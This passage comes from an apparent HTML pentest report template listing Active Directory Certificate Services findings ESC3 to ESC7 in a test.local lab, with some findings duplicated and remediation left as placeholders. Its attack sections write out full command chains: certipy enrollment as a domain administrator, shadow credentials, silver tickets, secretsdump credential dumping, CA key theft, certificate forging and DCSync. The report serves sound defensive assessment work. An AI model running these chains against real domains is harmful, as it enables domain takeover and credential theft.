                                                Certificate Signing Request (CSR)) on behalf of a domain admin in
                                                another template used for client authentication to impersonate them.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable
                                                        certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC3-1.png" alt="Finding ESC3">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template
                                                        that permits enrolling on behalf of another user (ESC3-CRA - has
                                                        the Certificate Request Agent EKU).</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        ESC3-CRA</p>
                                                    <p>The low-privileged user can this obtained certificate to request
                                                        a certificate in another template that allows authentication
                                                        (ESC3-template) on behalf of a domain adminstator.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        ESC3-template -on-behalf-of 'test\Administrator' -pfx test.pfx
                                                    </p>
                                                    <p>The low-privileged user can then use this domain admin
                                                        certificate with PKINIT to authenticate as the domain
                                                        administrator and obtain their NTLM hash, allowing full
                                                        impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC3-2.png"
                                                        alt="Exploiting ESC3">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC3 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC4"><u>ESC4</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users have unsafe permissions over a certificate template
                                            allowing impersonation of a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>ESC4-template</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=ESC4-template,CN=Certificate Templates,CN=Public Key
                                                        Services,CN=Services,CN=Configuration,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">Owner</td>
                                                    <td>TEST\Domain Users</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe
                                                permissions over a certificate template, giving them full control of the
                                                template. TEST\Domain Users has Owner rights over ESC4-template, giving
                                                full control of the template.</p>
                                            <p>This allows a low-privileged user to modify ESC4-template to be
                                                vulnerable to ESC1, enroll and supply a SAN of Administrator, and then
                                                authenticate as the domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable
                                                        certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png" alt="Finding ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can take the ESC4 template and change it
                                                        to be vulnerable to ESC1 technique by using the unsafe
                                                        permission over the template.</p>
                                                    <p class="code">python3 entry.py template -u test@test.local -p
                                                        'Password123!' -template ESC4ACL-template -save-old</p>
                                                    <p>The low-privileged user can then use the template to exploit
                                                        ESC1, enroll in the modified certificate template specifying a
                                                        UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        ESC4ACL-Template -upn administrator@test.local</p>
                                                    <p>The low-privileged user can then use this domain admin
                                                        certificate with PKINIT to authenticate as the domain
                                                        administrator and obtain their NTLM hash, allowing full
                                                        impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
                                                        alt="Exploiting ESC4">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC4 remediation - pki is tier 0 there should be no unsafe delegations on
                                                it</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC4"><u>ESC4</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users have unsafe permissions over a certificate template
                                            allowing impersonation of a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>ESC4ACL-template</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=ESC4ACL-template,CN=Certificate Templates,CN=Public Key
                                                        Services,CN=Services,CN=Configuration,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>NT AUTHORITY\Authenticated Users</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>GenericAll</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe
                                                permissions over a certificate template, giving them full control of the
                                                template. NT AUTHORITY\Authenticated Users has GenericAll over
                                                CN=ESC4ACL-template,CN=Certificate Templates,CN=Public Key
                                                Services,CN=Services,CN=Configuration,DC=test,DC=local, giving full
                                                control of the template.</p>
                                            <p>This allows a low-privileged user to modify ESC4ACL-template to be
                                                vulnerable to ESC1, enroll and supply a SAN of Administrator, and then
                                                authenticate as the domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable
                                                        certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png" alt="Finding ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can take the ESC4 template and change it
                                                        to be vulnerable to ESC1 technique by using the unsafe
                                                        permission over the template.</p>
                                                    <p class="code">python3 entry.py template -u test@test.local -p
                                                        'Password123!' -template ESC4ACL-template -save-old</p>
                                                    <p>The low-privileged user can then use the template to exploit
                                                        ESC1, enroll in the modified certificate template specifying a
                                                        UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        ESC4ACL-Template -upn administrator@test.local</p>
                                                    <p>The low-privileged user can then use this domain admin
                                                        certificate with PKINIT to authenticate as the domain
                                                        administrator and obtain their NTLM hash, allowing full
                                                        impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
                                                        alt="Exploiting ESC4">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC4 remediation - pki is tier 0 there should be no unsafe delegations on
                                                it</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC5"><u>ESC5</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can take control of a certificate authority and craft
                                            certificates for a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>CA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=CA,CN=Computers,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>NT AUTHORITY\Authenticated Users</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>Self, WriteProperty, GenericRead</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC5 is a vulnerability where a low privileged user has unsafe rights
                                                over PKI objects such as the CA object in AD. NT AUTHORITY\Authenticated
                                                Users has Self, WriteProperty, GenericRead over
                                                CN=CA,CN=Computers,DC=test,DC=local, giving full control of the
                                                certificate authority, and the domain PKI which is a tier 0 asset (as
                                                important as a domain controller).</p>
                                            <p>Compromise of a certificate authority allows a user extract the CA
                                                private key and use it to forge authentication certificates for any
                                                domain user, allowing impersonation of a domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc5">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can search for rogue permissions over CA
                                                        objects using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With these permissions, the user can add shadow credentials to
                                                        the CA object to obtain a certificate as the CA server. This
                                                        will update the msDS-KeyCredentialLink of the CA with a
                                                        key-pair, effectively backdooring the account.</p>
                                                    <p class="code">python3 pywhisker.py -d test.local -u test -p
                                                        'Password123!' --target 'ca$' --action add --dc-ip dc.test.local
                                                        </o>

                                                    <p>With the shadow credentials updated with the key-pair, these can
                                                        be used to request a TGT via PKINIT for the CA.</p>
                                                    <p class="code">python3 gettgtpkinit.py test.local/'ca$' -cert-pfx
                                                        ../pywhisker/hguhjXMA.pfx -pfx-pass kE2JBsYrnlfjY1iXzZQn
                                                        out.ccache</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With the TGT obtained from shadow credentials, the NTLM hash
                                                        of the certificate authority can be retrieved via
                                                        unpac-the-hash.</p>
                                                    <p class="code">export KRB5CCNAME=out.ccache</p>
                                                    <p class="code">python3 getnthash.py -key
                                                        07df53520ac65b82c309918e26f8c4384086af39f6ff264809cb2c186b0162e9
                                                        test.local/'ca$'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be forged
                                                        for the HOST service to impersonate the domain administrator for
                                                        that service.</p>
                                                    <p class="code">impacket-ticketer -domain-sid
                                                        S-1-5-21-1189352953-3643054019-2744120995 -domain test.local
                                                        -spn HOST/ca.test.local -nthash 6e8d0d396333b90e8c05efebc4f0fd70
                                                        -user-id 500 Administrator</p>

                                                    <p>The silver ticket can be used for the HOST service to dump
                                                        credentials with secretsdump and extract the local administrator
                                                        credentials to gain admin access to the PKI.</p>
                                                    <p class="code">export KRB5CCNAME=Administrator.ccache</p>
                                                    <p class="code">impacket-secretsdump 'administrator'@ca.test.local
                                                        -k -no-pass
                                                    <p>

                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>5. With admin access to the CA, the CA certificate and private
                                                        key can be extracted remotely with certipy.</p>
                                                    <p class="code">certipy ca -backup -ca 'test-CA-CA' -username
                                                        administrator@ca.test.local -hashes
                                                        :2b576acbe6bcfda7294d6bd18041b8fe</p>

                                                    <p> The CA private key can then be used to forge a certificate for a
                                                        domain administrator.</p>
                                                    <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn
                                                        administrator@test.local -subject
                                                        'CN=Administrator,CN=Users,DC=test,DC=local'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-5.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>Whilst the certificate may not be directly usable due to lack of
                                                        PKINIT, the certificate can be used with Schannel authentication
                                                        with pass-the-cert to grant a low-privileged user DCSync rights,
                                                        first extracting the CA's certificate and private key from the
                                                        unuseable pfx.</p>
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey
                                                        -out administrator.crt</p>
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert
                                                        -out administrator.key</p>
                                                    <p class="code">python3 /home/kali/Desktop/passthecert.py -action
                                                        modify_user -crt administrator.crt -key administrator.key
                                                        -target test -elevate -domain test.local -dc-ip 192.168.10.141
                                                    </p>

                                                    <p>With DCSync privileged granted the low-priivleged user can
                                                        extract all password hashes from the domain, showing how ESC5
                                                        can fully compomise the domain.</p>
                                                    <p class="code">impacket-secretsdump
                                                        test:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-6.png"
                                                        alt="Exploiting ESC5">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC5 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC5"><u>ESC5</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can take control of a certificate authority and craft
                                            certificates for a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>CA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=CA,CN=Computers,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>TEST\Account Operators</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>GenericAll</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC5 is a vulnerability where a low privileged user has unsafe rights
                                                over PKI objects such as the CA object in AD. TEST\Account Operators has
                                                GenericAll over CN=CA,CN=Computers,DC=test,DC=local, giving full control
                                                of the certificate authority, and the domain PKI which is a tier 0 asset
                                                (as important as a domain controller).</p>
                                            <p>Compromise of a certificate authority allows a user extract the CA
                                                private key and use it to forge authentication certificates for any
                                                domain user, allowing impersonation of a domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc5">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can search for rogue permissions over CA
                                                        objects using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With these permissions, the user can add shadow credentials to
                                                        the CA object to obtain a certificate as the CA server. This
                                                        will update the msDS-KeyCredentialLink of the CA with a
                                                        key-pair, effectively backdooring the account.</p>
                                                    <p class="code">python3 pywhisker.py -d test.local -u test -p
                                                        'Password123!' --target 'ca$' --action add --dc-ip dc.test.local
                                                        </o>

                                                    <p>With the shadow credentials updated with the key-pair, these can
                                                        be used to request a TGT via PKINIT for the CA.</p>
                                                    <p class="code">python3 gettgtpkinit.py test.local/'ca$' -cert-pfx
                                                        ../pywhisker/hguhjXMA.pfx -pfx-pass kE2JBsYrnlfjY1iXzZQn
                                                        out.ccache</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With the TGT obtained from shadow credentials, the NTLM hash
                                                        of the certificate authority can be retrieved via
                                                        unpac-the-hash.</p>
                                                    <p class="code">export KRB5CCNAME=out.ccache</p>
                                                    <p class="code">python3 getnthash.py -key
                                                        07df53520ac65b82c309918e26f8c4384086af39f6ff264809cb2c186b0162e9
                                                        test.local/'ca$'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be forged
                                                        for the HOST service to impersonate the domain administrator for
                                                        that service.</p>
                                                    <p class="code">impacket-ticketer -domain-sid
                                                        S-1-5-21-1189352953-3643054019-2744120995 -domain test.local
                                                        -spn HOST/ca.test.local -nthash 6e8d0d396333b90e8c05efebc4f0fd70
                                                        -user-id 500 Administrator</p>

                                                    <p>The silver ticket can be used for the HOST service to dump
                                                        credentials with secretsdump and extract the local administrator
                                                        credentials to gain admin access to the PKI.</p>
                                                    <p class="code">export KRB5CCNAME=Administrator.ccache</p>
                                                    <p class="code">impacket-secretsdump 'administrator'@ca.test.local
                                                        -k -no-pass
                                                    <p>

                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>5. With admin access to the CA, the CA certificate and private
                                                        key can be extracted remotely with certipy.</p>
                                                    <p class="code">certipy ca -backup -ca 'test-CA-CA' -username
                                                        administrator@ca.test.local -hashes
                                                        :2b576acbe6bcfda7294d6bd18041b8fe</p>

                                                    <p> The CA private key can then be used to forge a certificate for a
                                                        domain administrator.</p>
                                                    <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn
                                                        administrator@test.local -subject
                                                        'CN=Administrator,CN=Users,DC=test,DC=local'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-5.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>Whilst the certificate may not be directly usable due to lack of
                                                        PKINIT, the certificate can be used with Schannel authentication
                                                        with pass-the-cert to grant a low-privileged user DCSync rights,
                                                        first extracting the CA's certificate and private key from the
                                                        unuseable pfx.</p>
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey
                                                        -out administrator.crt</p>
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert
                                                        -out administrator.key</p>
                                                    <p class="code">python3 /home/kali/Desktop/passthecert.py -action
                                                        modify_user -crt administrator.crt -key administrator.key
                                                        -target test -elevate -domain test.local -dc-ip 192.168.10.141
                                                    </p>

                                                    <p>With DCSync privileged granted the low-priivleged user can
                                                        extract all password hashes from the domain, showing how ESC5
                                                        can fully compomise the domain.</p>
                                                    <p class="code">impacket-secretsdump
                                                        test:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-6.png"
                                                        alt="Exploiting ESC5">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC5 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC6"><u>ESC6</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
                                            allowing low-privileged users to impersonate a domain admin.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">CA Name</td>
                                                    <td>test-CA-CA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">CA hostname</td>
                                                    <td>CA.test.local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">EDITF_ATTRIBUTESUBJECTALTNAME2</td>
                                                    <td>True</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC6 is a vulnerability within ADCS where a Certificate Authority has the
                                                EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This flag allows the enrollee
                                                to specify an arbitrary SAN on all certificates despite a certificate
                                                template's configuration, meaning any certificate that permits client
                                                authentication are vulnerable to ESC1 even if they do not allow a user
                                                to supply a SAN.</p>
                                            <p>This allows a low-privileged user to enroll in any authentication
                                                template supplying a SAN of Administrator, and then authenticate as the
                                                domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain
                                                        certificate authorities that have the
                                                        EDITF_ATTRIBUTESUBJECTALTNAME2 flag set using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC6-1.png" alt="Finding ESC6">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Just as in ESC1, a low-privileged user can enroll in any
                                                        certificate template used for authentication, specifying a UPN
                                                        of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        User -upn administrator@test.local -dns dc.test.local</p>

                                                    <p>The low-privileged user can then use this certificate with PKINIT
                                                        to authenticate as the domain administrator and obtain their
                                                        NTLM hash, allowing full impersonation and domain privilege
                                                        escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC6-2.png"
                                                        alt="Exploiting ESC6">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC6 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC7"><u>ESC7</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has Manage CA or Manage Certificate rights allowing
                                            impersonation of a domain admin.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">CA Name</td>
                                                    <td>test-CA-CA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>TEST\test</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>ManageCA, ManageCertificates, Read, Enroll</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
